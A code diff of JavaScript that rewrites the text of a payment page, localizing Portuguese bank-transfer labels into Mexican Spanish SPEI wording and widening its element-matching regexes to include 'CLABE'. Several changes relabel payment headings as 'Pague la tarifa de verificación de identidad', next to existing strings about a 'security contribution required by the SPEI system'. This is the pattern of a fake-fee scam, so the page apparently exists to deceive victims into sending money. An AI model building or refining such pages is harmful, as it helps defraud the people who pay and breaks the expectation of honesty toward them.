@@ -679,8 +679,8 @@
           .replace(/Pague por/g, 'Paga por');
         if (next !== node.nodeValue) node.nodeValue = next;
       });
-      if (text === 'PAGA POR SPEI' || text === 'PAGUE POR SPEI') el.textContent = 'Pagar mediante SPEI';
-      if (text === 'PAGA POR' || text === 'PAGUE POR') el.textContent = 'Pague la tarifa de verificación de identidad';
+      if (text === 'PAGA POR SPEI' || text === 'PAGUE POR SPEI' || text === 'PAGUE VIA SPEI' || text === 'Pague via SPEI' || text === 'Pagar mediante SPEI') el.textContent = 'Pagar mediante SPEI';
+      if (text === 'PAGA POR' || text === 'PAGUE POR' || text === 'Confirme o pedido no app SPEI.' || text === 'Confirme o pedido no app SPEI' || text === 'Pague la tarifa de verificación de identidad') el.textContent = 'Pague la tarifa de verificación de identidad';
       if (text === 'Paga por SPEI' || text === 'Pague por SPEI') el.textContent = 'Pagar mediante SPEI';
       if (text === 'Entidade:' || text === 'Banco:') el.textContent = 'Banco:';
       if (text === 'Referência:') el.textContent = 'Referencia:';
@@ -860,12 +860,12 @@
     });
     var heading = Array.prototype.find.call(document.querySelectorAll('p,span,div,strong,h1,h2,h3'), function (el) {
       var text = (el.textContent || '').replace(/\s+/g, ' ').trim();
-      return /^(?:PAGUE|PAGA)(?: POR| VIA)? SPEI$/i.test(text);
+      return /^(?:PAGUE|PAGA)(?: POR| VIA)? SPEI$/i.test(text) || text === 'Pagar mediante SPEI';
     });
     var paymentCard = heading;
     while (paymentCard && paymentCard !== document.body) {
       var cardText = (paymentCard.textContent || '').replace(/\s+/g, ' ');
-      if (/(?:Banco|Método de pago):/i.test(cardText) && /Referencia:/i.test(cardText)) break;
+      if (/(?:Banco|Método de pago):/i.test(cardText) && /(?:Referencia|CLABE):/i.test(cardText)) break;
       paymentCard = paymentCard.parentElement;
     }
     if (!paymentCard || paymentCard === document.body) {
@@ -880,7 +880,7 @@
     var reference = getCurrentSpeiReference();
     var referenceBox = Array.prototype.filter.call(paymentCard.querySelectorAll('div'), function (el) {
       var text = (el.textContent || '').replace(/\s+/g, ' ');
-      return /(?:Banco|Método de pago):/i.test(text) && /Referencia:/i.test(text);
+      return /(?:Banco|Método de pago):/i.test(text) && /(?:Referencia|CLABE):/i.test(text);
     }).sort(function (a, b) {
       return (a.textContent || '').length - (b.textContent || '').length;
     })[0] || null;
@@ -946,11 +946,12 @@
       value = value.replace(/Contribuição/g, 'Contribucion');
       value = value.replace(/Contribuição de seguridad exigida pelo sistema SPEI/g, 'Contribucion de seguridad requerida por el sistema SPEI');
       value = value.replace(/após a confirmação SPEI/g, 'despues de la confirmacion SPEI');
-      value = value.replace(/PAGUE POR SPEI/g, 'PAGA POR SPEI');
-      value = value.replace(/PAGUE POR/g, 'PAGA POR');
-      value = value.replace(/Pague por SPEI/g, 'Paga por SPEI');
-      value = value.replace(/Pague por/g, 'Paga por');
-      value = value.replace(/Use a entidade e referência no app do seu banco\./g, 'Usa los datos SPEI en la app de tu banco.');
+      value = value.replace(/PAGUE POR SPEI|PAGUE VIA SPEI/gi, 'Pagar mediante SPEI');
+      value = value.replace(/PAGUE POR/gi, 'Pague la tarifa de verificación de identidad');
+      value = value.replace(/Pague por SPEI|Pague via SPEI/gi, 'Pagar mediante SPEI');
+      value = value.replace(/Pague por/gi, 'Pague la tarifa de verificación de identidad');
+      value = value.replace(/Confirme o pedido no app SPEI\.?/gi, 'Pague la tarifa de verificación de identidad');
+      value = value.replace(/Use a entidade e referência no app do seu banco\./gi, 'Usa los datos SPEI en la app de tu banco.');
       value = value.replace(/Entidade:/g, 'Banco:');
       value = value.replace(/Referência:/g, 'Referencia:');
       value = value.replace(/Aguardando pagamento/g, 'Esperando pago');
